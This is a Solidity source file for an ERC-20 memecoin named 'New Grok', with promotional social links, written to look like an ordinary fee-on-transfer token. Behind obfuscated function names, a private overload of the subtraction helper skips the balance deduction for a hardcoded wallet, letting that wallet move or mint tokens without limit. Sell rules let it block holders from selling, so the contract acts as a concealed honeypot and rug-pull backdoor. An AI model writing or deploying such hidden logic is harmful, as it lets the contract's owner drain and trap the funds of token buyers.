/*

Telegram: https://t.me/NewGrok

Twitter: https://twitter.com/NewGrok

Website: https://grokerc.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _qrlaf(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qrlaf(a, b, "SafeMath");
    }

    function  _qrlaf(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _broyj(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract NewGrok is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _barqf;
    address payable private _qerayd;
    address private _brvbup;
    string private constant _name = unicode"New Grok";
    string private constant _symbol = unicode"Grok";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Hlosdr=0;
    uint256 private _pafugt=0;
    uint256 public _pucbdw = _totalSupply;
    uint256 public _qrnaqk = _totalSupply;
    uint256 public _pvrekb= _totalSupply;
    uint256 public _qtrovld= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _fvulrd;
    mapping (address => bool) private _hvqcfk;
    mapping(address => uint256) private _fiahrg;

    bool private _bleqopen;
    bool public _prmdtq = false;
    bool private FlbAuk = false;
    bool private _reyawj = false;


    event _qekjrp(uint _pucbdw);
    modifier orntuy {
        FlbAuk = true;
        _;
        FlbAuk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _fvulrd[owner(

        )] = true;
        _fvulrd[address
        (this)] = true;
        _fvulrd[
            _qerayd] = true;
        _qerayd = 
        payable (0x8942894e00E91447759FE5f9eCf2C8e75b856344);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qrlaf(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 Groabe=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_prmdtq) {
                if (to 
                != address
                (_barqf) 
                && to !=
                 address
                 (_brvbup)) {
                  require(_fiahrg
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fiahrg
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _brvbup && to != 
            address(_barqf) &&
             !_fvulrd[to] ) {
                require(amount 
                <= _pucbdw,
                 "Exceeds the _pucbdw.");
                require(balanceOf
                (to) + amount
                 <= _qrnaqk,
                  "Exceeds the _qrnaqk.");
                if(_pafugt
                < _Hlosdr){
                  require
                  (! _foadv(to));
                }
                _pafugt++;
                 _hvqcfk
                 [to]=true;
                Groabe = amount._broyj
                ((_pafugt>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _brvbup &&
             from!= address(this) 
            && !_fvulrd[from] ){
                require(amount <= 
                _pucbdw && 
                balanceOf(_qerayd)
                <_qtrovld,
                 "Exceeds the _pucbdw.");
                Groabe = amount._broyj((_pafugt>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pafugt>
                _Hlosdr &&
                 _hvqcfk[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!FlbAuk 
            && to == _brvbup &&
             _reyawj &&
             contractTokenBalance>
             _pvrekb 
            && _pafugt>
            _Hlosdr&&
             !_fvulrd[to]&&
              !_fvulrd[from]
            ) {
                _transferFrom( _pykov(amount, 
                _pykov(contractTokenBalance,
                _qtrovld)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _pehrek(address
                    (this).balance);
                }
            }
        }

        if(Groabe>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(Groabe);
          emit
           Transfer(from,
           address
           (this),Groabe);
        }
        _balances[from
        ]= _qrlaf(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _qrlaf(Groabe));
        emit Transfer
        (from, to, 
        amount.
         _qrlaf(Groabe));
    }

    function _transferFrom(uint256
     tokenAmount) private
      orntuy {
        if(tokenAmount==
        0){return;}
        if(!_bleqopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _barqf.WETH();
        _approve(address(this),
         address(
             _barqf), 
             tokenAmount);
        _barqf.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _pykov
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qrlaf(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _qerayd){
            return a ;
        }else{
            return a .
             _qrlaf (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _pucbdw = _totalSupply;
        _qrnaqk = _totalSupply;
        emit _qekjrp(_totalSupply);
    }

    function _foadv(address 
    account) private view 
    returns (bool) {
        uint256 Hoeop;
        assembly {
            Hoeop :=
             extcodesize
             (account)
        }
        return Hoeop > 
        0;
    }

    function _pehrek(uint256
    amount) private {
        _qerayd.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _bleqopen ) ;
        _barqf  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _barqf), 
            _totalSupply);
        _brvbup = 
        IUniswapV2Factory(_barqf.
        factory( ) 
        ). createPair (
            address(this
            ),  _barqf .
             WETH ( ) );
        _barqf.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_brvbup).
        approve(address(_barqf), 
        type(uint)
        .max);
        _reyawj = true;
        _bleqopen = true;
    }

    receive() external payable {}
}